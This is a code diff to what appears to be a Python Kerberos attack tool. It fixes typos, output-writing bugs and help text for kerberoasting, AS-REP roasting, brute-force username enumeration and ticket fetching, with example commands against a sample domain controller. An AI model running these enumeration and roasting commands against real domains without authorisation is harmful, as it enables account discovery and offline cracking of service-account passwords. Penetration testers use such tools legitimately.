@@ -44,7 +44,7 @@ List all kerberoastable users:
 List all asreproastable users users: 
    - kerberoast ldap asrep 'ldap://TEST\\victim:Passw0rd!1@10.10.10.2'
 
-Brute-force guss of usernames via kerberos:
+Brute-force guess of usernames via kerberos:
 	(username_dict.txt is a list of usernames (without domain) one username per line)
    - kerberoast brute TEST.corp 10.10.10.2 username_dict.txt
    
@@ -335,7 +335,7 @@ async def amain(args):
 				if result is True:
 					if args.out_file:
 						with open(args.out_file, 'a') as f:
-							f.write(result + '\r\n')
+							f.write(str(spn) + '\r\n')
 					else:
 						print('[+] Enumerated user: %s' % str(spn))
 
@@ -404,7 +404,9 @@ async def amain(args):
 			cnt = 0
 			if args.out_file:
 				with open(os.path.join(basefolder,basefile+'_spn_users.txt'), 'w', newline='') as f:
-					async for user in client.get_all_service_users():
+					async for user, err in client.get_all_service_users():
+						if err is not None:
+							raise err
 						cnt += 1
 						f.write('%s@%s\r\n' % (user.sAMAccountName, domain))
 			
@@ -539,13 +541,13 @@ def main():
 	spnroast_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
 	spnroast_group.add_argument('-e','--etype', default=-1, const=-1, nargs='?', choices= [23, 17, 18, -1], type=int, help = 'Set preferred encryption type. -1 for all')
 
-	spnroastsspi_group = subparsers.add_parser('spnroast-sspi', help='Perform spn roasting (aka kerberoasting)')
+	spnroastsspi_group = subparsers.add_parser('spnroast-sspi', help='Perform spn roasting (aka kerberoasting). Only works on Windows')
 	spnroastsspi_group.add_argument('-t','--targets', help='File with a list of usernames to roast, one user per line')
 	spnroastsspi_group.add_argument('-u','--user',  action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
 	spnroastsspi_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
 	spnroastsspi_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
 	
-	multiplexorsspi_group = subparsers.add_parser('spnroast-multiplexor', help='')
+	multiplexorsspi_group = subparsers.add_parser('spnroast-multiplexor', help='Perform spn roasting (aka kerberoasting) ')
 	multiplexorsspi_group.add_argument('-t','--targets', help='File with a list of usernames to roast, one user per line')
 	multiplexorsspi_group.add_argument('-u','--user',  action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
 	multiplexorsspi_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
@@ -558,9 +560,9 @@ def main():
 	tgt_group.add_argument('kerberos_connection_url', help='Either CCACHE file name or Kerberos login data in the following format: <domain>/<username>/<secret_type>:<secret>@<dc_ip_or_hostname>')
 	tgt_group.add_argument('out_file',  help='Output CCACHE file')
 	
-	tgs_group = subparsers.add_parser('tgs', help='Fetches a TGT for the given user credential',formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
+	tgs_group = subparsers.add_parser('tgs', help='Fetches a TGS for the given user credential',formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
 	tgs_group.add_argument('kerberos_connection_url', help='Either CCACHE file name or Kerberos login data in the following format: <domain>/<username>/<secret_type>:<secret>@<dc_ip_or_hostname>')
-	tgs_group.add_argument('spn',  help='SPN strong of the service to get TGS for. Expected format: <domain>/<hostname>')
+	tgs_group.add_argument('spn',  help='SPN of the service to get TGS for. Expected format: <spn>@<domain>')
 	tgs_group.add_argument('out_file',  help='Output CCACHE file')
 	
 
